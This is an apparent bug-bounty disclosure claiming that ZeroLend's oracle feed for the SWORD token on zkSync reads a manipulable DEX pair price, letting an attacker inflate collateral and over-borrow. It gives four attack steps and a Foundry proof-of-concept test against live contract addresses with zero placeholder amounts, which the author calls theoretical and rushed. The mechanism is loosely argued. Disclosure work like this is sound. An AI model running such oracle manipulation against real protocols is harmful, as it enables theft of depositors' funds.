# 29344 - \[SC - Insight] Price assets deposited manipulation

Submitted on Mar 14th 2024 at 13:49:09 UTC by @Lastc0de for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29344

Report type: Smart Contract

Report severity: Insight

Target: <https://explorer.zksync.io/address/0x785765De3E9ac3D8eEb42B4724A7FEA8990142B8>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

NOTE: This vulnerability was discovered in the last hour and forgive me if there is a problem typing words as I was typing and reporting quickly before the time expired

##

Zero Land is a fork of AAVE, so its calculations are exactly similar to AAVE calculations.

Based on this: when the user wants to borrow, he/she must first make a deposit, then based on the price that the user has deposited, the user can borrow other assets.

The value of assets that the user has deposited is taken from `AaveOracle.sol` and `AaveOracle` returns the value based on the feed specified by the owner of the protocol, but in your protocol the value can be manipulated and it can be said that all the funds in your protocol can be stolen by this method.

In your protocol, to calculate the number of assets active in your protocol, different `Pairs` pools are used to calculate the value of those assets

For this reason, your protocol is vulnerable to `price manipulation`, because price manipulation is very common and simple in `Pairs`(Ex: Uniswap), and since in your protocol, the most important tasks, such as charging, are calculated based on the value of an asset, this can cause the theft of funds. be you

## Vulnerability Details

For Ex: One of assets in your protocol is `SWORD`:

<https://explorer.zksync.io/address/0xDB87A5493e308Ee0DEb24C822a559bee52460AFC>

`AaveOracle.sol` wants to get the price of this, it uses the following feed:

<https://explorer.zksync.io/address/0x65B28bAfDB15DD3Cb47a568FBa27fABb5b7d99d4#contract>

This contract uses `_getPrice()` function to get the price:

```
    function _getPrice() internal view returns (int256) {
        IAggregatorV3Interface pyth = IAggregatorV3Interface(ethAggregrator);

        int256 tokenPrice = int256(pool.getAmountOut(1e18, sword));
        int256 ethOraclePrice = pyth.latestAnswer() * 1e10;

        return (tokenPrice * int256(ethOraclePrice)) / 1e28;
    }
```

This function returns `tokenPrice` by calling the `getAmountOut()` function in the eZKalibur `pool` address

* eZKalibur is fork from Uniswap v2.

Here the vulnerability appears in the your Oracle, it is easy to manipulate the return value of the `_getPrice()` function by minting and burning the LP token in pair, as a result, considering that your feed uses a pair and uses the return value as the assets value A attacker can easily `manipulate` the return value of `_getPrice()` and increase the amount of assets and borrow more assets and steal the funds in your protocol.

## Impact Details

Attacker, can first depasite a vulnerable token then increase its price using its pair thereby borrowing a token more than the value of something it has already deposited

## References

## Proof of Concept

NOTE : PoC only theoretically wrote that due to lack of time, vulnerability was discovered in the final hours.

1-Attacker Deposit SWORD in your protocol

2-Attacker increases the value of his asset by manipulating its Pair

3-Attacker, can borrow but more than the value of his property

4-Attacker,return back assets in Pair by burn LP Tokens

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Counter} from "../src/Counter.sol";

interface IPair {
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
}
interface IAaveOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}
contract CounterTest is Test {
    address Pair = 0xc8b6B3A4D2d8428EF3a940EAc1E32A7DdAdCB0f1;
    address WETH = 0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91;
    address SWORD = 0x240f765Af2273B0CAb6cAff2880D6d8F8B285fa4;
    address AaveOracle = 0x785765De3E9ac3D8eEb42B4724A7FEA8990142B8;


    function setUp() public {
        vm.createSelectFork("https://zksync.meowrpc.com");
        deal(SWORD,address(this), 0); //Flash loan or swap
        deal(SWORD,address(this), 0); //Flash loan or swap
        deal(WETH, address(this), 0); 
    }

    function test_Manipulation() public {
        console2.log("Asset Price Before Exploit: %e",IAaveOracle(AaveOracle).getAssetPrice(SWORD) );
        IERC20(WETH).transfer(Pair, 0); // Enter amount
        IERC20(SWORD).transfer(Pair, 0); // Enter Amount
        IPair(Pair).mint(address(this));
        console2.log("Asset Price After Exploit: %e",IAaveOracle(AaveOracle).getAssetPrice(SWORD) );

    }
}
```
